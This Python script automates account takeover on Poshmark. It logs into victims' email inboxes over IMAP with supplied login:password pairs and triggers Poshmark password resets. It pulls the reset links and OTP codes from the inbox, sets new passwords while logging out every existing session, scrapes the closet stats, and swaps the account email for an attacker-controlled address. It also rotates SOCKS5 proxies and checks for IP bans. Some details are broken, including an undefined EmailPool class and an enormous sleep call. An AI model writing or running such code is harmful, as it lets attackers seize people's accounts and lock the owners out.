from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Any
import time
from app.services.imap import connect_imap, find_emails, find_verification_code
import nodriver as nd

import random
import string


def generate_password(length: int = 16) -> str:
    lowercase = string.ascii_lowercase
    uppercase = string.ascii_uppercase
    digits = string.digits
    symbols = "!@#$%^&*"
    all_chars = lowercase + uppercase + digits + symbols
    password = [
        random.choice(lowercase),
        random.choice(uppercase),
        random.choice(digits),
        random.choice(symbols),
    ]
    password += random.choices(all_chars, k=length - 4)
    random.shuffle(password)
    return "".join(password)

async def handle_verify_email(
    tab,
    mail
):
    try:

        verify_title = await tab.select(
            'h5[data-test="modal-title"]',
            timeout=5
        )

        if not verify_title:
            return False

        title_text = verify_title.text.strip()

        if "Verify Email" not in title_text:
            return False

        code = await asyncio.to_thread(
            find_verification_code,
            mail,
            ["poshmark", "Poshmark"],
            60,
            5
        )

        if not code:
            raise Exception(
                "OTP not found"
            )

        otp_input = await tab.select(
            'input[name="otp"]'
        )

        await otp_input.clear_input()
        await otp_input.click()
        await otp_input.send_keys(code)

        done_btn = await tab.select(
            'button[data-et-name="submit"]'
        )

        await done_btn.click()

        return True

    except Exception as e:

        print(
            f"VERIFY ERROR: {e}"
        )

        return False

async def open_closet_and_parse_stats(tab):
    # =====================================
    # КЛИК ПО АВАТАРКЕ
    # =====================================

    avatar = await tab.select("img.user-image.user-image--s", timeout=10)
    await avatar.click()

    await asyncio.sleep(3)

    # =====================================
    # КЛИК ПО My Closet
    # =====================================

    closet_link = await tab.select('a[href*="/closet/"]', timeout=10)
    await closet_link.click()

    await asyncio.sleep(4)

    # =====================================
    # ПАРСИНГ СТАТИСТИКИ
    # =====================================

    listing_el = await tab.select('[data-test="closet_listings_count"]')
    share_el = await tab.select('[data-test="closet_shares_count"]')
    followers_el = await tab.select('[data-test="closet_followers_count"]')
    following_el = await tab.select('[data-test="closet_following_count"]')

    stats = {
    "listing": listing_el.text.strip(),
    "share": share_el.text.strip(),
    "followers": followers_el.text.strip(),
    "following": following_el.text.strip(),
    }



    return stats

async def handle_verify_modal(tab, mail):
    try:
        # =====================================
        # КЛИК ПО Change
        # =====================================

        change_btn = await tab.select(
            'a[data-et-name="change_email"]',
            timeout=10
        )

        await change_btn.click()

        await asyncio.sleep(3)

        # =====================================
        # ПРОВЕРКА VERIFY MODAL
        # =====================================

        verify_title = await tab.select(
            'h5[data-test="modal-title"]',
            timeout=10
        )

        title_text = verify_title.text.strip()

        if "Verify" not in title_text:
            return False

        print("🔐 Verify modal detected")
        await asyncio.sleep(20)
        # =====================================
        # ДОСТАЕМ КОД ИЗ ПОЧТЫ
        # =====================================

        code = await asyncio.to_thread(
            find_verification_code,
            mail,
            ["poshmark", "Poshmark"],
            60,
            5,
        )

        if not code:
            raise Exception("Verification code not found")

        print(f"📨 CODE: {code}")

        # =====================================
        # ВВОД КОДА
        # =====================================

        otp_input = await tab.select(
            'input[name="otp"]',
            timeout=10
        )

        await otp_input.clear_input()
        await otp_input.click()
        await otp_input.send_keys(code)

        await asyncio.sleep(1)

        # =====================================
        # SUBMIT
        # =====================================

        submit_btn = await tab.select(
            'button.btn.btn--primary.width--100',
            timeout=10
        )

        await submit_btn.click()

        print("✅ Verification submitted")

        await asyncio.sleep(5)

        return True

    except Exception as e:
        print(f"❌ Verify modal error: {e}")
        return False

async def handle_change_email_modal(
    tab,
    new_email: str
):
    try:
        # =====================================
        # ЖДЕМ МОДАЛКУ Change Email
        # =====================================

        title = await tab.select(
            'h5[data-test="modal-title"]',
            timeout=10
        )

        title_text = title.text.strip()

        if "Change Email" not in title_text:
            return False

        print("📧 Change Email modal detected")

        # =====================================
        # ВВОД НОВОГО EMAIL
        # =====================================

        email_input = await tab.select(
            'input[name="newEmail"]',
            timeout=10
        )

        await email_input.clear_input()
        await email_input.click()
        await email_input.send_keys(new_email)

        # =====================================
        # КНОПКА Done
        # =====================================
        await asyncio.sleep(2)
        done_btn = await tab.select(
            'button.btn.btn--primary',
            timeout=10
        )

        await done_btn.click()

        print(f"✅ New email submitted: {new_email}")

        return True

    except Exception as e:
        print(f"❌ Change Email modal error: {e}")
        return False
@dataclass
class AccountCreds:
    raw: str
    login: str
    password: str


@dataclass
class ProxyCreds:
    raw: str
    proxy_url: str


def parse_account(line: str) -> AccountCreds:
    parts = [p.strip() for p in line.split(":")]
    if len(parts) != 2:
        raise ValueError(f"Invalid account format: {line}")
    return AccountCreds(raw=line, login=parts[0], password=parts[1])

async def wait_page_loaded(tab):
    end = asyncio.get_running_loop().time() + 30

    while asyncio.get_running_loop().time() < end:
        state = await tab.evaluate("document.readyState")

        if state == "complete":
            return True

        await asyncio.sleep(0.3)

    return False

def parse_proxy(line: str) -> ProxyCreds:
    raw = line.strip()
    if "://" in raw:
        return ProxyCreds(raw=line, proxy_url=raw)
    p = raw.split(":")
    if len(p) == 2:
        host, port = p
        return ProxyCreds(raw=line, proxy_url=f"socks5://{host}:{port}")
    if len(p) == 4:
        host, port, user, pwd = p
        return ProxyCreds(raw=line, proxy_url=f"socks5://{user}:{pwd}@{host}:{port}")
    raise ValueError(f"Invalid proxy format: {line}")


async def inputHandler(selector: str, text: str, tab: Any):
    input_el = await tab.select(selector)
    await input_el.clear_input()
    await input_el.click()
    await input_el.send_keys(text)


async def start_browser(headless: bool = False) -> Any:
    return await nd.start(headless=headless)


async def create_context_with_proxy(browser: Any, proxy: ProxyCreds | None) -> Any:
    if proxy:
        return await browser.create_context(
            url="https://poshmark.com/user/password/reset",
            proxy_server=proxy.proxy_url,
        )
    return await browser.create_context(url="https://poshmark.com/user/password/reset")


async def run_ip_check(
    browser: Any,
    account: AccountCreds,
    proxy: ProxyCreds | None,
    email_pool: EmailPool,
    timeout_sec: int = 300,
    
) -> dict[str, Any]:
    email_consumed = False
    # =====================================
    # IMAP CHECK
    # =====================================
    email_creds = await email_pool.acquire(timeout=5)
    
    if not email_creds:
        return {
            "status": "error",
            "error": "NO_FREE_EMAILS"
        }
    
    tab = None
        # ✅ результат формируем в переменной — return только после finally
    result: dict[str, Any] = {}

    try:
        imap_result = await asyncio.to_thread(
            connect_imap,
            account.login,
            account.password,
            proxy.raw if proxy else None,
        )

        if not imap_result["success"]:

            return {
                "status": "error",
                "stage": "imap",
                "account": account.login,
                "proxy": proxy.raw if proxy else None,
                "error": imap_result["error"],
                "message": imap_result["message"],
            }

        # =====================================
        # BROWSER
        # =====================================


        tab = await create_context_with_proxy(browser, proxy)
        await tab.find("Ok", timeout=10)  # ждём, что страница ответит — если прокси не работает, будет таймаут
        await tab.select('body')
        await asyncio.sleep(5)

        await inputHandler('#usernameEmail', account.login, tab)
        await asyncio.sleep(1)

        btn = await tab.select('button[data-et-name="reset_password"]')
        await btn.click()
        await asyncio.sleep(4)
        await wait_page_loaded(tab)
        # ========= ПРОВЕРКА IP_BANNED =========

        try:
            el = await tab.select('h2.br--light-gray.br--bottom.p--b--4', timeout=10)
            if "Reset Password Email Sent" not in (await el.get_html()):
                raise ValueError("Unexpected h2 content")
        except Exception:
            result = {
                "status": "error",
                "stage": "browser",
                "account": account.login,
                "proxy": proxy.raw if proxy else None,
                "error": "IP_BANNED",
                "message": "Reset password confirmation not found — IP is likely banned",
            }
            # ✅ не делаем return здесь — выходим через finally
            raise _EarlyExit()

        # ========= IMAP — ИЩЕМ ПИСЬМО =========

        try:
            mail = imap_result["mail"]
            await asyncio.sleep(20)
            link = await asyncio.to_thread(
                find_emails, mail, ["poshmark", "Poshmark"], 10, 2
            )
            if not link:
                raise ValueError("no reset link found")
        except Exception as e:
            result = {
                "status": "error",
                "stage": "imap",
                "account": account.login,
                "proxy": proxy.raw if proxy else None,
                "error": "IMAP_EMAIL_NOT_FOUND",
                "message": f"Failed to find reset email: {e}",
            }
            raise _EarlyExit()

        # ========= СБРОС ПАРОЛЯ =========

        try:
            await tab.get(link)
            await wait_page_loaded(tab)
            
            new_password = generate_password()

            await inputHandler('#newPassword', new_password, tab)
            await asyncio.sleep(1)
            await inputHandler('#confirmPassword', new_password, tab)
            await asyncio.sleep(1)

            checkbox = await tab.select('input[data-et-name="logout_all_sessions"]')
            await checkbox.click()
            await asyncio.sleep(1)

            reset_btn = await tab.select('button[data-et-name="reset_password"]')
            await reset_btn.click()
            
            login_btn = await tab.select('button[data-et-name="login"]',timeout=10)
            await login_btn.click()
            await wait_page_loaded(tab)
            await inputHandler(
                '#login_form_username_email',
                account.login,
                tab
            )

            await asyncio.sleep(1)

            # password

            await inputHandler(
                '#login_form_password',
                new_password,
                tab
            )

            await asyncio.sleep(1)

            # login button

            login_btn = await tab.select(
                'button[data-et-name="login"]',
                timeout=10
            )

            await login_btn.scroll_into_view()
            await asyncio.sleep(0.3)

            await login_btn.click()
            await asyncio.sleep(20)
            await handle_verify_email(tab, mail)
            await asyncio.sleep(2)
            stats = await open_closet_and_parse_stats(tab)
            print(stats)
            await tab.get("https://poshmark.com/user/account-info")
            await wait_page_loaded(tab)
            await handle_verify_modal(tab, mail)
            await handle_change_email_modal(tab, email_creds.login)
            
            await asyncio.sleep(10000000000000)
            # ✅ успех — формируем результат
            result = {
                "status": "ok",
                "stage": "done",
                "account": account.login,
                "email_password": account.password,
                "new_password": new_password,
                "proxy": proxy.raw if proxy else None,
            }

        except _EarlyExit:
            raise  # пробрасываем наверх
        except Exception as e:
            result = {
                "status": "error",
                "stage": "browser",
                "account": account.login,
                "proxy": proxy.raw if proxy else None,
                "error": "RESET_FAILED",
                "message": f"Password reset step failed: {e}",
            }

    except _EarlyExit:
        pass  # result уже заполнен выше

    except Exception as e:
        result = {
            "status": "error",
            "stage": "browser",
            "account": account.login,
            "proxy": proxy.raw if proxy else None,
            "error": "BROWSER_ERROR",
            "message": str(e),
        }

    finally:
        if email_creds and not email_consumed:
            await email_pool.release(email_creds)
        
        if tab is not None:
            try:
                await tab.close()
                mail.logout()
            except Exception:
                pass

    return result


class _EarlyExit(Exception):
    """Внутреннее исключение для выхода из вложенных try без return."""
    pass


async def safe_close_browser(browser: Any) -> None:
    if not browser:
        return
    try:
        await browser.stop()
    except Exception:
        pass